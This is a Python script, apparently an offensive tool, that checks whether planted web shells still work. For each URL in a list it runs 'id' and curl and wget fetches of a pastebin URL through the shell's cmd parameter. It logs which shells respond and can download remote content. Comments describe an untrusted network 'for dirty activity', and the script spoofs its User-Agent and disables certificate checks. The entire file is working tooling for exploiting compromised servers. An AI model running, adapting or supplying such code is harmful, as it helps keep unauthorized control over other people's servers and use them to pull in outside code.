import argparse
import os
import sys
import time
import logging

import requests
import pandas
import urllib3
from requests.adapters import HTTPAdapter, Retry
# Suppress only the single warning from urllib3.
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
ascii_red_color = "\x1b[1;31m"
reset_ascii_color = "\u001B[0m"



def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-l', help='Path to list with web shells', required=True)
    # blue network - trusted; red - non-trusted;
    parser.add_argument('-blue-network', help='Network for writing results to API.', required=False)
    parser.add_argument('-red-network', help='Network for sending requests.', required=False)
    parser.format_help()
    args = parser.parse_args()
    # changing network for dirty activity
    trusted_network = args.blue_network
    non_trusted_network = args.red_network
    shells_list = args.l
    time.sleep(3)
    # os.system(f"nmcli connection up {non_trusted_network}")
    if len(sys.argv) == 0 or shells_list == '' or args is None:
        parser.print_help()
        sys.exit(1)
    if args.l.endswith('.txt'):
        check_status_txt_file(shells_list, trusted_network)
    if args.l.endswith('.csv'):
        check_status_csv_file(shells_list, trusted_network)


def check_status_txt_file(path, trusted_network):
    with (open(path) as txt_file):
        for line in txt_file:
            send_requests_and_check_responses(line)
    txt_file.close()
    write_results_to_api_service(trusted_network)


def check_status_csv_file(path, trusted_network):
    with (open(path, newline='') as csv_file):
        results = pandas.read_csv(csv_file, usecols=['url'])
        row_count = len(results)
        for index in range(row_count):
            line = results.__array__().item(index)
            send_requests_and_check_responses(line)
    csv_file.close()
    write_results_to_api_service(trusted_network)


def send_requests_and_check_responses(shell_url):
    # TODO: think about change file logic open and saving data on exception
    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
    cmd_id = "id"
    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
    # this command checks could file be downloaded and redirects output to stdout without saving it
    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"

    file_with_working_shells = "working.txt"
    file_with_not_working_shells = "not_working.txt"
    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.DEBUG)
    requests_log.propagate = True

    requests.get('https://httpbin.org/headers')
    with open(file_with_working_shells, 'w') as working_shells_file:
        with open(file_with_not_working_shells, 'w') as not_working_shells_file:
            print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)

            s = requests.Session()
            s.max_redirects = 3
            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[404, 500, 502, 503, 504])
            s.mount('http://', HTTPAdapter(max_retries=retries))
            s.mount('https://', HTTPAdapter(max_retries=retries))
            s.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                                            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'})

            try:
                response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
                response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
                response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
            except requests.exceptions.ConnectionError as exception:
                print(exception)
                not_working_shells_file.write(shell_url + "\n")
            except urllib3.exceptions:
                print("Error was occurred during execution. Check network connection.")
                not_working_shells_file.close()
                working_shells_file.close()

            contains_uid = response_text_id.find("uid")
            contains_wget_file = secret_message in response_text_wget
            contains_curl_file = secret_message in response_text_curl
            if contains_uid != -1 and contains_curl_file and contains_wget_file:

                response_status = requests.get(shell_url + "?cmd=id").status_code
                print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
                      "Status code: " + str(response_status))
                print("All necessary commands works." + reset_ascii_color)

                working_shells_file.write(shell_url + "\n")
            elif contains_uid != -1 or contains_curl_file or contains_wget_file:
                print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")
            else:
                print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
                      "Check path to shell " + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")

    not_working_shells_file.close()
    working_shells_file.close()


def write_results_to_api_service(trusted_network):
    # os.system(f"nmcli connection uo {trusted_network}")
    print("Updating result in API service...")


def print_banner():
    print(ascii_purple_color)
    print(' .---------------------------------------------------------------.' + "\n"
          ' |      O                                                        |' + "\n"
          ' |      |                                                        |' + "\n"               
          ' |0{XXXX}+===================================================>   |' + "\n"  
          ' |      |                                                        |' + "\n"
          ' |      O                                                        |' + "\n"                                                                     
          ' |---------------------------------------------------------------|' + "\n"                                                                     
          ' | __        _______ ____    ____  _   _ _____ _     _     ____  |' + "\n"
          ' | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |' + "\n"
          ' |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |' + "\n"
          ' |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||' + "\n"
          ' |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |' + "\n"
          ' |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |' + "\n"
          " | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |" + "\n"
          ' | | |___|  _  | |__| |___| . \\| |___|  _ <                      |' + "\n"
          ' |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |' + "\n"
          ' |                                                               |' + "\n"
          " '---------------------------------------------------------------'")
    print(reset_ascii_color)


if __name__ == '__main__':
    print_banner()
    parse_arguments()
